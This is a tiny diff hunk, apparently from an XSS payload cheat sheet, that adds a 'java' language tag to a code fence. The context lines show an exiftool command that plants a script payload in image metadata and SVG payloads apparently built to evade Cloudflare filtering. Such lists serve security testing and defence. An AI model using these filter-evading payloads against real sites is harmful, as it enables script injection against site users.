@@ -346,7 +346,7 @@ $ exiftool -Artist='"><script>alert(1)</script>' dapos.jpeg
 
 1. Cloudflare
 
-```
+```java
 <svg%0Aonauxclick=0;[1].some(confirm)//
 
 <svg/onload={alert`1`}>
